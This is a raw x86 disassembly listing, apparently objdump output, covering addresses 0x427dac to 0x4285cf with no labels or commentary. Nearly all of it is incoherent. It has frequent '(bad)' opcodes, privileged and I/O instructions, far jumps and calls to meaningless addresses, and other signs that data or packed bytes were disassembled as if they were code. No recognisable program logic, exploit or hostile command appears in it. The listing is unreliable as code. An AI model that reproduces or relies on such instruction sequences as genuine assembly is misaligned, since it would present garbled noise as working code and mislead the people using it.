  427dac:	(bad)  
  427dad:	or     al,0x5
  427daf:	inc    eax
  427db0:	leave  
  427db1:	in     al,dx
  427db2:	add    al,0x42
  427db4:	push   esi
  427db5:	and    eax,0xedc940cf
  427dba:	inc    DWORD PTR [eax-0x75]
  427dbd:	fmul   QWORD PTR [ebx-0xf8739be]
  427dc3:	inc    eax
  427dc4:	nop
  427dc5:	jmp    0x518b:0x8b8bc3ff
  427dcc:	(bad)  
  427dcd:	lea    eax,ds:0xff45e8f8
  427dd3:	push   esi
  427dd4:	push   DWORD PTR [ebp-0x39]
  427dd7:	mov    eax,0x7edda46
  427ddc:	or     al,0x6
  427dde:	push   DWORD PTR [ebp-0x3a]
  427de1:	cmp    eax,DWORD PTR [edx]
  427de3:	pop    esi
  427de4:	ret    
  427de5:	or     al,0x56
  427de7:	inc    ecx
  427de8:	push   ebp
  427de9:	js     0x427dd7
  427deb:	inc    edx
  427dec:	inc    ebp
  427ded:	int    0x1
  427def:	inc    ecx
  427df0:	sub    BYTE PTR ds:0xe77541fc,ah
  427df6:	add    DWORD PTR [edx+0x1c],eax
  427df9:	int3   
  427dfa:	mov    eax,ebx
  427dfc:	adc    al,0x8b
  427dfe:	xchg   edx,eax
  427dff:	push   ecx
  427e00:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  427e06:	rcl    DWORD PTR [esi-0x9],cl
  427e09:	jne    0x427e5b
  427e0b:	mov    eax,0x7c80ece
  427e10:	rol    DWORD PTR [esi],cl
  427e12:	div    DWORD PTR [ebp+0x50]
  427e15:	cmp    ecx,edx
  427e17:	pop    esi
  427e18:	dec    BYTE PTR [edx]
  427e1a:	in     al,dx
  427e1b:	inc    edx
  427e1c:	sub    ebp,ecx
  427e1e:	inc    eax
  427e1f:	(bad)  
  427e20:	push   eax
  427e21:	add    edx,DWORD PTR [eax-0x17]
  427e24:	push   edi
  427e25:	add    dh,dh
  427e27:	leave  
  427e28:	adc    DWORD PTR [ebp-0x1],0xffffffec
  427e2c:	add    BYTE PTR [ecx+0x0],dl
  427e2f:	inc    ebp
  427e30:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  427e36:	add    BYTE PTR [eax-0x7fbf448],bh
  427e3c:	add    al,0x2
  427e3e:	jmp    0x57e2998
  427e43:	jne    0x427e2d
  427e45:	mov    eax,DWORD PTR [edx]
  427e47:	or     BYTE PTR [eax],al
  427e49:	inc    ecx
  427e4a:	stc    
  427e4b:	in     eax,dx
  427e4c:	ss inc eax
  427e4e:	aas    
  427e4f:	out    0x7d,eax
  427e51:	inc    ecx
  427e52:	mov    esi,ecx
  427e54:	lock ret 0x7d
  427e58:	and    ecx,DWORD PTR [ebx-0x171777]
  427e5e:	add    bh,bh
  427e60:	aad    0xd7
  427e62:	add    dh,cl
  427e64:	clts   
  427e66:	(bad)  
  427e67:	call   0xffcd7d6c
  427e6c:	hlt    
  427e6d:	iret   
  427e6e:	jge    0x427e46
  427e70:	rol    DWORD PTR [esi-0x80],cl
  427e73:	icebp  
  427e74:	or     BYTE PTR [edi-0x27],cl
  427e77:	(bad)  
  427e78:	out    dx,al
  427e79:	mov    eax,DWORD PTR [ebx]
  427e7b:	(bad)  
  427e7c:	pop    esi
  427e7d:	push   es
  427e7e:	cmp    al,0xe8
  427e80:	sar    edi,0x8
  427e83:	inc    DWORD PTR [edi]
  427e85:	inc    esi
  427e86:	(bad)  
  427e87:	jmp    0x8b00:0x530e577e
  427e8e:	push   esi
  427e8f:	mov    eax,DWORD PTR [eax]
  427e91:	and    al,0x0
  427e93:	inc    ebp
  427e94:	push   eax
  427e95:	push   eax
  427e96:	add    DWORD PTR [ebx+0x757d1834],ecx
  427e9c:	sub    edx,DWORD PTR [esi-0x24]
  427e9f:	jne    0x427e57
  427ea1:	lods   eax,DWORD PTR ds:[esi]
  427ea2:	mov    edx,DWORD PTR [edx-0x34]
  427ea5:	dec    esi
  427ea6:	out    0x83,eax
  427ea8:	into   
  427ea9:	push   edi
  427eab:	loopne 0x427e7b
  427ead:	shr    BYTE PTR [edx+ecx*4+0x0],1
  427eb1:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  427eb8:	rol    DWORD PTR [edx],0x8
  427ebb:	mov    esp,ecx
  427ebd:	cmp    DWORD PTR [ebx],0xc
  427ec0:	mov    esi,0x5001c0
  427ec5:	push   eax
  427ec6:	push   cs
  427ec7:	push   eax
  427ec8:	(bad)  
  427ec9:	sub    edx,edi
  427ecb:	push   esi
  427ecc:	adc    al,0xcb
  427ece:	ins    DWORD PTR es:[edi],dx
  427ecf:	mov    eax,0x203e8
  427ed4:	add    al,ah
  427ed6:	ror    BYTE PTR [eax+0xc007c0],0xc0
  427edd:	add    dh,al
  427edf:	add    ah,ch
  427ee1:	rol    DWORD PTR [ebx-0x3595fb0d],1
  427ee7:	pop    ecx
  427ee8:	or     eax,ebx
  427eea:	cli    
  427eeb:	add    BYTE PTR [ecx-0x4e728d1e],dh
  427ef1:	lea    ebp,[ebx]
  427ef3:	mov    edx,DWORD PTR [edx-0x4]
  427ef6:	dec    ecx
  427ef7:	inc    ebp
  427ef8:	shr    BYTE PTR [ebx],0x4b
  427efb:	and    al,0x0
  427efd:	(bad)  
  427efe:	jne    0x427f45
  427f00:	pop    eax
  427f01:	mov    al,0x5a
  427f03:	call   0x1418162
  427f08:	and    al,0x85
  427f0a:	push   edx
  427f0b:	add    BYTE PTR [eax+eax*1+0x0],ah
  427f0f:	dec    ebp
  427f10:	mov    cl,0x23
  427f12:	jmp    0x427f00
  427f14:	mov    al,0xe7
  427f16:	call   0x1388204
  427f1b:	shr    DWORD PTR [eax+ebx*2],cl
  427f1e:	lock (bad) 
  427f20:	adc    eax,0x757f008d
  427f25:	out    0x58,eax
  427f27:	cmp    al,0x7
  427f29:	pop    edx
  427f2a:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  427f31:	push   ecx
  427f32:	cld    
  427f33:	mov    esi,0x3b0175
  427f38:	and    al,0xb0
  427f3a:	xor    BYTE PTR [edx+0x1],0x8b
  427f3e:	add    ah,bh
  427f40:	mov    edi,DWORD PTR [ebp-0x4]
  427f43:	psubsw mm7,QWORD PTR [edi]
  427f46:	add    DWORD PTR [ebp+0x0],ebp
  427f49:	rcr    eax,1
  427f4b:	mov    edi,ecx
  427f4d:	and    eax,DWORD PTR [eax]
  427f4f:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  427f55:	call   0x12f823e
  427f5a:	add    al,cl
  427f5c:	mov    ebp,esi
  427f5e:	aam    0x83
  427f60:	or     DWORD PTR [ecx],eax
  427f62:	jne    0x427f55
  427f64:	mov    eax,DWORD PTR [eax]
  427f66:	aam    0x0
  427f68:	dec    ebp
  427f69:	jne    0x427ef6
  427f6b:	cmp    ebx,eax
  427f6d:	jb     0x427fbc
  427f6f:	jmp    0x427efc
  427f71:	mov    ebx,esp
  427f73:	int3   
  427f74:	dec    ebp
  427f75:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  427f7c:	mov    edx,0x8b0a8b
  427f81:	cmp    ecx,DWORD PTR [eax]
  427f83:	jb     0x427f5c
  427f85:	pop    edx
  427f86:	push   edi
  427f87:	cli    
  427f88:	pop    es
  427f89:	mov    eax,ecx
  427f8b:	jb     0x427f8f
  427f8d:	add    DWORD PTR [ebx],0xa
  427f90:	mov    eax,DWORD PTR [ebx]
  427f92:	int3   
  427f93:	add    bh,BYTE PTR [esi+0x75d10006]
  427f99:	jmp    0x427f26
  427f9b:	mov    al,0xe8
  427f9d:	call   0x103821f
  427fa2:	add    edx,DWORD PTR [ecx+ecx*8]
  427fa5:	pop    edi
  427fa6:	or     BYTE PTR [ecx-0x73],bl
  427fa9:	pop    ecx
  427faa:	inc    edi
  427fab:	xor    al,0xeb
  427fad:	push   ecx
  427fae:	mov    edi,DWORD PTR [edx+0xc506cc]
  427fb4:	call   0xb180b9
  427fb9:	int3   
  427fba:	sbb    BYTE PTR [esi],ch
  427fbc:	inc    ebp
  427fbd:	add    BYTE PTR [ebx-0x1f4f338b],cl
  427fc3:	call   0x9b8232
  427fc8:	or     BYTE PTR [ebx-0x73],dl
  427fcb:	cmp    al,0x47
  427fcd:	mov    al,0x1
  427fcf:	jb     0x427fd1
  427fd1:	mov    al,0x10
  427fd3:	push   eax
  427fd4:	add    al,0x75
  427fd6:	add    BYTE PTR [ebx],ch
  427fd8:	add    ebx,esp
  427fda:	int3   
  427fdb:	jne    0x427fed
  427fdd:	movsx  edx,cl
  427fe0:	add    DWORD PTR [eax],eax
  427fe2:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  427fe9:	mov    gs,edi
  427feb:	add    BYTE PTR [eax-0x50],ch
  427fee:	add    al,ch
  427ff0:	mov    eax,DWORD PTR [ecx]
  427ff2:	sub    eax,DWORD PTR [eax]
  427ff4:	jb     0x42806b
  427ff6:	add    DWORD PTR [esp+eiz*8-0x50],esi
  427ffa:	jge    0x427fe4
  427ffc:	add    al,0x1
  427ffe:	add    DWORD PTR [eax],0x0
  428001:	jne    0x428003
  428003:	je     0x42804a
  428005:	mov    eax,DWORD PTR [edi]
  428007:	ror    BYTE PTR [ebp+0x4d],1
  42800a:	or     DWORD PTR [ecx+0x4d03d004],0x3
  428011:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  428017:	mov    DWORD PTR [ebx],ebp
  428019:	fadd   DWORD PTR [eax+0x75]
  42801c:	inc    eax
  42801d:	pop    eax
  42801e:	lea    ebx,[ecx+0x4f]
  428021:	push   0xb1000003
  428026:	out    dx,eax
  428027:	add    ebp,DWORD PTR [edx+edx*2]
  42802a:	add    BYTE PTR [ebx+ecx*4],bh
  42802d:	mov    ch,BYTE PTR [ebx]
  42802f:	jb     0x4280a3
  428031:	add    al,0x89
  428033:	push   eax
  428034:	call   0x842acda6
  428039:	add    DWORD PTR [eax+eax*1],eax
  42803c:	jae    0x428052
  42803e:	icebp  
  42803f:	inc    ebp
  428040:	mov    eax,DWORD PTR gs:[ecx]
  428043:	int3   
  428044:	out    dx,al
  428045:	loopne 0x428094
  428047:	sub    eax,DWORD PTR [edx]
  428049:	push   0xffffff83
  42804b:	pop    esi
  42804c:	push   cs
  42804d:	jl     0x428068
  42804f:	add    al,0xaf
  428051:	xor    eax,0x832b6d00
  428056:	mov    eax,DWORD PTR [edx]
  428058:	rcr    BYTE PTR [ebp+0x754500dc],cl
  42805e:	ror    DWORD PTR [ebx+0x7dc8e803],1
  428064:	inc    ebp
  428065:	shr    ebx,0x3
  428068:	or     DWORD PTR [eax],0x4
  42806b:	push   0xffffffa5
  42806d:	pop    esi
  42806e:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  428075:	jmp    0x4280d4
  428077:	mov    edi,0xff0272
  42807c:	fdivr  QWORD PTR [ebp+0x5d]
  42807f:	push   0x4e
  428081:	pop    ecx
  428082:	call   0x42c487
  428087:	mov    DWORD PTR [ebx],eax
  428089:	in     al,0xc8
  42808b:	rol    BYTE PTR [ebp-0x75],0xc1
  42808f:	call   0xac8270
  428094:	pop    esi
  428095:	enter  0xceff,0x8b
  428099:	repz mov ecx,DWORD PTR [ebp-0x34]
  42809d:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  4280a4:	je     0x4280a6
  4280a6:	or     DWORD PTR [ebx-0x74183b24],eax
  4280ac:	jne    0x428092
  4280ae:	jmp    0x4280a9
  4280b0:	push   DWORD PTR [edx-0x24]
  4280b3:	push   0x4d
  4280b5:	pop    ecx
  4280b6:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  4280ba:	jge    0x4280c2
  4280bc:	mov    eax,eax
  4280be:	sub    ebp,DWORD PTR [edx+0x24]
  4280c1:	pop    esi
  4280c2:	inc    ebp
  4280c3:	mov    esp,0x8b6077
  4280c8:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  4280ce:	lods   al,BYTE PTR ds:[esi]
  4280cf:	add    BYTE PTR [ebx],bh
  4280d1:	enter  0xce73,0x49
  4280d5:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  4280dd:	stc    
  4280de:	jge    0x428152
  4280e0:	jnp    0xdd42044f
  4280e6:	call   0xc581bc
  4280eb:	fadd   st(0),st
  4280ed:	dec    esi
  4280ee:	ins    BYTE PTR es:[edi],dx
  4280ef:	stc    
  4280f0:	cmp    al,0x73
  4280f2:	push   ebp
  4280f3:	mov    eax,0xf8028b
  4280f8:	jne    0x4280bb
  4280fa:	mov    esi,ecx
  4280fc:	mov    esp,DWORD PTR [ebp+0x2c]
  4280ff:	add    edi,DWORD PTR [ebp-0x24]
  428102:	sub    esp,eax
  428104:	and    al,0x45
  428106:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  42810c:	sbb    al,0xee
  42810e:	pop    esi
  42810f:	call   0x82813f
  428114:	fsubr  st,st(3)
  428116:	sti    
  428117:	add    BYTE PTR gs:[ecx],bh
  42811a:	add    eax,esp
  42811c:	add    DWORD PTR [esi],eax
  42811e:	rol    DWORD PTR [ebp+0x8],0x29
  428122:	mov    esp,eax
  428124:	clc    
  428125:	jne    0x42819c
  428127:	mov    eax,0x8b0673
  42812c:	loopne 0x428173
  42812e:	loopne 0x4280b9
  428130:	lods   al,BYTE PTR ds:[esi]
  428131:	int3   
  428132:	inc    ebp
  428133:	mov    DWORD PTR gs:[eax+edi*8],eax
  428137:	add    al,0xc3
  428139:	sub    ecx,DWORD PTR [ebp+0x47]
  42813c:	(bad)  
  42813e:	shr    BYTE PTR [ebp-0x1f],0xe8
  428142:	add    eax,DWORD PTR [eax]
  428144:	call   0x6444249
  428149:	add    esi,DWORD PTR [esi-0x3b2efc83]
  42814f:	dec    esi
  428150:	ins    DWORD PTR es:[edi],dx
  428151:	in     al,dx
  428152:	lea    eax,[eax]
  428154:	inc    ebp
  428155:	inc    ebp
  428156:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  42815c:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  428166:	and    al,0xdc
  428168:	ror    DWORD PTR [edx+0x24],0xf7
  42816c:	or     BYTE PTR [ebp+0x4c],dh
  42816f:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  428173:	stos   BYTE PTR es:[edi],al
  428174:	adc    edx,edi
  428176:	inc    esp
  428177:	add    edi,DWORD PTR [eax]
  428179:	jne    0x42815e
  42817b:	mov    DWORD PTR [eax-0x7449db04],ecx
  428181:	cmp    ecx,DWORD PTR [edi]
  428183:	sub    BYTE PTR [ebp-0x7e],dl
  428186:	sar    ebp,0xb
  428189:	jmp    FWORD PTR [edi+0x2400392a]
  42818f:	sub    esi,DWORD PTR [ebx-0x73]
  428192:	mov    esp,DWORD PTR [ecx+edi*4]
  428195:	mov    ecx,DWORD PTR [eax]
  428197:	and    BYTE PTR [eax],al
  428199:	jne    0x428165
  42819b:	sub    ebp,ecx
  42819d:	sbb    BYTE PTR [esi+0x32],ah
  4281a0:	dec    ebp
  4281a1:	push   ebp
  4281a2:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  4281a8:	ret    
  4281a9:	mov    edx,ebp
  4281ab:	leave  
  4281ac:	sub    DWORD PTR [esi+0x24],ebx
  4281af:	ret    0x2b
  4281b2:	pop    ax
  4281b4:	push   ebp
  4281b5:	rol    BYTE PTR [ebx],0xeb
  4281b8:	add    DWORD PTR [ecx+0x6c0001],0x40
  4281bf:	jb     0x428216
  4281c1:	ret    
  4281c2:	in     al,dx
  4281c3:	jecxz  0x428150
  4281c5:	push   esi
  4281c6:	xchg   esp,eax
  4281c7:	jne    0x4281c9
  4281c9:	cmp    edx,DWORD PTR [esi+0x1c]
  4281cc:	jne    0x4281b2
  4281ce:	mov    eax,DWORD PTR [ebp-0x77]
  4281d1:	ror    DWORD PTR [ebx+0x899408],0xe0
  4281d8:	mov    esi,DWORD PTR [ebp-0x75]
  4281db:	pop    esi
  4281dc:	nop
  4281dd:	mov    eax,DWORD PTR [eax]
  4281df:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  4281e5:	add    al,0x0
  4281e7:	inc    ebp
  4281e8:	mov    eax,DWORD PTR [ebx]
  4281ea:	mov    ebp,ebx
  4281ec:	cmp    al,0xf
  4281ee:	or     al,al
  4281f0:	inc    ebp
  4281f1:	inc    ebp
  4281f2:	cmp    BYTE PTR [ebx+0x6c8bc89c],cl
  4281f8:	cld    
  4281f9:	add    BYTE PTR [edi+0x506c16c0],dh
  4281ff:	add    BYTE PTR [ecx-0x5],dl
  428202:	add    eax,0x17200
  428207:	sbb    al,0x85
  428209:	dec    esp
  42820a:	je     0x428244
  42820c:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  428210:	add    BYTE PTR [ebx],bh
  428212:	(bad)  
  428213:	and    al,0x39
  428215:	jae    0x4281b3
  428217:	mov    cl,cl
  428219:	inc    DWORD PTR [esp]
  42821c:	push   ebp
  42821d:	shr    esp,0x8
  428220:	in     al,dx
  428221:	push   esp
  428222:	add    DWORD PTR [eax],esp
  428224:	add    bl,cl
  428226:	inc    ebp
  428227:	mov    bh,0x89
  428229:	add    ah,bh
  42822b:	jmp    0xca7b9175
  428230:	pushf  
  428231:	dec    esp
  428232:	mov    edx,0xf8178520
  428237:	fst    DWORD PTR [ebp+0x0]
  42823a:	mov    BYTE PTR [eax],0xc4
  42823d:	sub    edx,DWORD PTR [ebx-0x3f]
  428240:	inc    ebp
  428241:	add    eax,0xc601dc
  428246:	mov    al,0xc6
  428249:	ins    BYTE PTR es:[edi],dx
  42824a:	mov    DWORD PTR [eax+0x57],0x2e0545c1
  428251:	dec    esp
  428252:	jmp    DWORD PTR [eax]
  428254:	inc    ebp
  428255:	fnstcw WORD PTR [eax+0x29]
  428258:	test   BYTE PTR [eax],0xc5
  42825b:	rol    BYTE PTR [eax],0xc0
  42825e:	lea    ecx,[ebp-0x3cf0dbcb]
  428264:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  42826a:	inc    esi
  42826b:	add    DWORD PTR [eax],ebx
  42826d:	add    dh,bh
  42826f:	mov    esi,DWORD PTR [edx+0x8]
  428272:	(bad)  
  428273:	fdiv   QWORD PTR ss:[ecx]
  428276:	(bad)  
  428277:	mov    bl,ch
  428279:	add    esi,eax
  42827b:	add    dh,bl
  42827d:	or     esi,eax
  42827f:	mov    dl,0xdf
  428281:	add    esi,eax
  428283:	add    al,ah
  428285:	push   cs
  428286:	mov    BYTE PTR [edx+0xc601e1],0xe2
  42828d:	or     BYTE PTR [ebx],dh
  42828f:	dec    ecx
  428290:	lea    eax,[ebx]
  428292:	xor    eax,0x18fc0fc7
  428297:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428298:	repz clc 
  42829a:	add    eax,DWORD PTR [ebp+0x46]
  42829d:	prefetcht0 BYTE PTR [ecx-0x2]
  4282a1:	xor    eax,0x7c60872
  4282a6:	mov    esp,0xbd32c698
  4282ab:	pop    esi
  4282ac:	mov    cl,0xbe
  4282af:	or     al,0xc6
  4282b1:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  4282b8:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  4282bf:	add    dh,al
  4282c1:	mov    eax,ebx
  4282c3:	xor    DWORD PTR [ebx],0x35008dbc
  4282c9:	mov    ecx,DWORD PTR [edi]
  4282cb:	sbb    al,0x18
  4282cd:	inc    ebp
  4282ce:	xrelease mov DWORD PTR [ebx],0x188546f4
  4282d5:	clc    
  4282d6:	(bad)  
  4282d7:	cmp    BYTE PTR [edx-0x64],dh
  4282da:	lea    ecx,[ecx+0x45ffe838]
  4282e0:	mov    ecx,esp
  4282e2:	fadd   st,st(6)
  4282e4:	dec    ebp
  4282e5:	lds    edi,FWORD PTR [eax+0x7145fc56]
  4282eb:	out    0x1,eax
  4282ed:	inc    ebp
  4282ee:	lea    ebp,ds:0xc8ffc6ff
  4282f4:	enter  0xa33,0xc6
  4282f8:	push   ebp
  4282f9:	leave  
  4282fa:	(bad)  
  4282fb:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  428301:	add    BYTE PTR [ebp+0x44],al
  428304:	mov    eax,esp
  428306:	mov    WORD PTR [esi+0x43398300],?
  42830c:	psubusw mm4,QWORD PTR [eax-0x78]
  428310:	add    BYTE PTR [ebx-0x1303f975],al
  428316:	add    BYTE PTR [ebp+0x1],0xf3
  42831a:	add    BYTE PTR [ebp+0x38],al
  42831d:	in     eax,dx
  42831e:	inc    ebp
  42831f:	inc    ebp
  428320:	mov    esp,ebx
  428322:	add    BYTE PTR [ebp+0x0],0xee
  428326:	mov    DWORD PTR [ebp-0x48],eax
  428329:	sub    eax,0x2e00454f
  42832e:	js     0x428375
  428330:	data16 js 0x4282b8
  428333:	idiv   bh
  428335:	inc    esp
  428336:	(bad)  
  428337:	fadd   st(7),st
  428339:	mov    dh,0x89
  42833b:	and    DWORD PTR [esi+0x43],0xffffffff
  42833f:	fld    DWORD PTR [ebx-0x767cc078]
  428345:	pop    es
  428346:	push   0x8d45ffec
  42834b:	in     eax,dx
  42834c:	inc    DWORD PTR [ebp-0x77]
  42834f:	loopne 0x4283bb
  428351:	inc    ebp
  428352:	jmp    esp
  428354:	add    DWORD PTR [ebp+0x11],0xfffffff1
  428358:	mov    DWORD PTR [ebp+0x6c],eax
  42835b:	(bad)  
  42835d:	inc    ebp
  42835e:	(bad)  
  42835f:	call   0xe7cbc870
  428364:	outs   dx,BYTE PTR ds:[esi]
  428365:	inc    ebp
  428366:	(bad)  
  428367:	js     0x4282ec
  428369:	div    BYTE PTR ds:0x70bc8944
  42836f:	mov    dh,0xff
  428371:	or     DWORD PTR [ebp-0x7626f5bd],0xffffff88
  428378:	jb     0x4282fd
  42837a:	dec    DWORD PTR [eax]
  42837c:	mov    ebp,esp
  42837e:	test   WORD PTR [ebp-0x1],ax
  428385:	inc    ebp
  428386:	ror    BYTE PTR [ebx-0x117a279a],0xff
  42838d:	adc    edi,edi
  42838f:	mov    ecx,esi
  428391:	mov    eax,DWORD PTR [eax]
  428393:	cmp    BYTE PTR [esi-0x1],ah
  428396:	test   DWORD PTR [ebx],edi
  428398:	push   DWORD PTR [ebp-0x1]
  42839b:	mov    DWORD PTR [esi-0x48],ebp
  42839e:	add    BYTE PTR [ebp+0x66],al
  4283a1:	jmp    0x428328
  4283a3:	pushf  
  4283a4:	dec    DWORD PTR [ebx-0x7f9c0301]
  4283aa:	add    BYTE PTR [ecx],al
  4283ac:	data16 add BYTE PTR [ebp-0x7a00c8],al
  4283b3:	add    al,al
  4283b5:	add    BYTE PTR [esi+0x45],ah
  4283b8:	test   DWORD PTR [ebx+0xff7cff],ecx
  4283be:	dec    esp
  4283bf:	mov    DWORD PTR [eax],eax
  4283c1:	mov    esp,DWORD PTR [esi-0x4]
  4283c4:	inc    ebp
  4283c5:	cmp    BYTE PTR [eax+0x4701],0x38
  4283cc:	mov    DWORD PTR [ecx-0x7e],esp
  4283cf:	add    BYTE PTR [edi-0x73],al
  4283d2:	push   0xffffffd1
  4283d4:	mov    WORD PTR [ebp+0x64],ax
  4283d8:	(bad)  
  4283d9:	call   eax
  4283db:	mov    esp,eax
  4283dd:	data16 icebp 
  4283df:	test   DWORD PTR [ebp-0x1],eax
  4283e2:	(bad)  
  4283e4:	out    0xc0,eax
  4283e6:	lea    esp,[esi-0x30]
  4283e9:	test   DWORD PTR [edx+0x43ff80ff],ecx
  4283ef:	inc    edi
  4283f0:	jmp    0x75ff:0x40858866
  4283f7:	dec    DWORD PTR [ebp-0x7a992f40]
  4283fd:	test   esi,edi
  4283ff:	(bad)  
  428400:	(bad)  
  428401:	inc    DWORD PTR [ebp-0x9901b9]
  428407:	test   DWORD PTR [ebx+0x50fff4ff],ecx
  42840d:	rcl    BYTE PTR [ecx+0x66],0x33
  428411:	test   DWORD PTR [ebx+0xff72ff],edi
  428417:	inc    edi
  428418:	ret    
  428419:	mov    ax,WORD PTR [ebp-0x3f0004]
  428420:	push   eax
  428421:	mov    DWORD PTR [ebp-0x77],0xff98748b
  428428:	add    BYTE PTR [ebx-0x764ff439],al
  42842e:	push   DWORD PTR [esi+0x1]
  428431:	inc    DWORD PTR [eax]
  428433:	mov    eax,0xff99ff
  428438:	or     BYTE PTR [ecx-0x7a87bb],cl
  42843e:	jne    0x4283f8
  428440:	add    DWORD PTR [edx-0x76edff72],0xff707a8d
  42844a:	mov    ecx,0xd74fb8
  42844f:	add    cl,al
  428451:	mov    DWORD PTR [ecx-0x3f007784],ecx
  428457:	or     DWORD PTR [ebx+0x558966ec],0x7e
  42845e:	(bad)  
  42845f:	push   ebp
  428461:	mov    eax,0x8c2789
  428466:	ret    0x6689
  428469:	adc    BYTE PTR [ebp+0x4c],0x8d
  42846d:	add    bl,bl
  42846f:	mov    WORD PTR [ebp-0x70],ax
  428473:	(bad)  
  428474:	ret    0x660d
  428477:	or     BYTE PTR [ebp-0x77],dl
  42847a:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  428481:	in     al,0x89
  428483:	(bad)  
  428484:	xchg   esi,eax
  428485:	aam    0xcf
  428487:	call   0x45dafd15
  42848c:	dec    edx
  42848d:	pop    ecx
  42848e:	mov    edx,DWORD PTR [eax]
  428490:	repnz push bp
  428493:	or     BYTE PTR [ebx+0x5510663b],0x49
  42849a:	(bad)  
  42849b:	repnz xor eax,0xa0898945
  4284a1:	mov    ah,0x89
  4284a3:	jmp    DWORD PTR [edx+0x66b0418d]
  4284a9:	inc    DWORD PTR [ebp+0x50]
  4284ac:	add    DWORD PTR [ebp-0x5],0xffffffbe
  4284b0:	mov    DWORD PTR [eax],ecx
  4284b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4284b3:	pop    es
  4284b4:	inc    ecx
  4284b5:	(bad)  
  4284b6:	cbw    
  4284b8:	inc    ebp
  4284b9:	xor    ah,BYTE PTR [esi+0x3]
  4284bc:	dec    ebp
  4284bd:	push   eax
  4284be:	inc    bp
  4284c0:	jge    0x428445
  4284c2:	mov    esp,DWORD PTR [esi-0x18]
  4284c5:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  4284cb:	add    DWORD PTR [ebx],esi
  4284cd:	add    BYTE PTR [ebx],al
  4284cf:	test   DWORD PTR [ebx],esi
  4284d1:	(bad)  
  4284d2:	inc    WORD PTR [ebp+0x0]
  4284d6:	mov    eax,DWORD PTR [eax]
  4284d8:	call   0x88983c0d
  4284dd:	mov    esi,eax
  4284df:	clc    
  4284e0:	ret    
  4284e1:	rol    cl,0xa
  4284e4:	mov    DWORD PTR ds:0x7c0ec88,esi
  4284ea:	mov    edx,edi
  4284ec:	pushf  
  4284ed:	pop    es
  4284ee:	jmp    FWORD PTR [edx+0x66]
  4284f1:	add    BYTE PTR [ebp-0x990175],al
  4284f7:	inc    ebp
  4284f8:	test   DWORD PTR [ebx-0x2f000202],eax
  4284fe:	push   ebp
  4284ff:	mov    edi,eax
  428501:	mov    dh,BYTE PTR [eax+0x266ff51]
  428507:	push   ebp
  428508:	add    BYTE PTR [ebx-0x764b1777],al
  42850e:	dec    DWORD PTR [esi+0x661851e8]
  428514:	add    BYTE PTR [ebp-0x7b],dl
  428517:	cmp    esi,0xfffffffb
  42851a:	dec    DWORD PTR [ecx+0x51fe9285]
  428520:	jmp    DWORD PTR [esi-0x75]
  428523:	push   ebp
  428524:	hlt    
  428525:	data16 (bad) 
  428527:	dec    ebp
  428528:	ret    
  428529:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  42852f:	lea    edx,[eax-0x1]
  428532:	jne    0x428505
  428534:	dec    DWORD PTR [ecx-0x2f7a63f8]
  42853a:	dec    BYTE PTR [ecx+0x51559eff]
  428540:	mov    DWORD PTR [esi-0x4c],esp
  428543:	push   ebp
  428544:	jmp    DWORD PTR [esi-0x18]
  428547:	inc    ebp
  428548:	sbb    BYTE PTR [ebp-0x767ae500],cl
  42854e:	(bad)  
  42854f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428550:	inc    eax
  428552:	test   DWORD PTR [esi-0x2],esp
  428555:	inc    ebp
  428556:	dec    DWORD PTR [ebp-0x760bde75]
  42855c:	(bad)  
  42855d:	test   al,0xc3
  42855f:	mov    DWORD PTR [ebp-0x769b56],ecx
  428565:	lods   al,BYTE PTR ds:[esi]
  428566:	push   eax
  428567:	inc    ebp
  428568:	jne    0x428579
  42856a:	dec    DWORD PTR [ebp+0x8]
  42856d:	mov    eax,DWORD PTR [edi]
  42856f:	sbb    al,0x0
  428571:	(bad)  
  428572:	mov    eax,0xc14fc3
  428577:	mov    DWORD PTR [eax-0x64],edi
  42857a:	inc    bp
  42857c:	test   DWORD PTR [edi],ecx
  42857e:	dec    DWORD PTR [ebp-0x1]
  428581:	xor    eax,edi
  428583:	add    ecx,DWORD PTR [ecx-0x99bdcd]
  428589:	inc    ebp
  42858a:	xor    DWORD PTR [ebx],0x3f
  42858d:	mov    WORD PTR [ebp-0x1bc],ax
  428594:	lea    ecx,[ecx-0x767702]
  42859a:	inc    esi
  42859b:	(bad)  
  42859c:	call   FWORD PTR [ebp+ecx*4-0x3e72be01]
  4285a3:	pushf  
  4285a4:	rol    DWORD PTR [ebp-0x72019a],0xff
  4285ab:	add    bh,bh
  4285ad:	add    BYTE PTR [edi],cl
  4285af:	test   DWORD PTR [eax],eax
  4285b1:	(bad)  
  4285b2:	dec    WORD PTR [ebp-0xff002d]
  4285b9:	mov    DWORD PTR [eax+edi*4+0x0],edi
  4285bd:	jmp    DWORD PTR [esi-0x73]
  4285c0:	lea    esi,[eax+0x50ffffff]
  4285c6:	fadd   QWORD PTR [ebp+0x0]
  4285c9:	xor    esp,DWORD PTR [esi+0x3]
  4285cc:	lea    edx,[eax-0x1]
  4285cf:	test   edi,edi
